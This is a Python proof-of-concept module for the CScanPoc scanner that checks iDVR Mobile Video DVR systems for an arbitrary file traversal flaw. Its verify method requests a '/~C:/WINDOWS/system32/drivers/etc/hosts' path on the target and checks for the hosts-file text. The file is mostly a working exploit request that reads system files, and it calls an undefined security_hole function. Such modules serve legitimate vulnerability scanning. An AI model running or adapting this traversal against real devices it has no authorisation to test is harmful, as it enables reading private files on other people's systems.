# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'iDVR_0001'  # 平台漏洞编号，留空
    name = 'iDVR Mobile Video dvr系统任意文件遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        iDVR Mobile Video dvr系统任意文件遍历。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'iDVR'  # 漏洞应用名称
    product_version = 'iDVR Mobile Video dvr'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8965770f-6964-4dd8-8896-886eda9f1c24'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/~C:/WINDOWS/system32/drivers/etc/hosts'
            code, head, res, err, _ = hh.http(url)

            if code == 200 and 'This is a sample HOSTS file used by Microsoft TCP/IP for Windows' in res:
                security_hole('Arbitrarilly file download: ' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
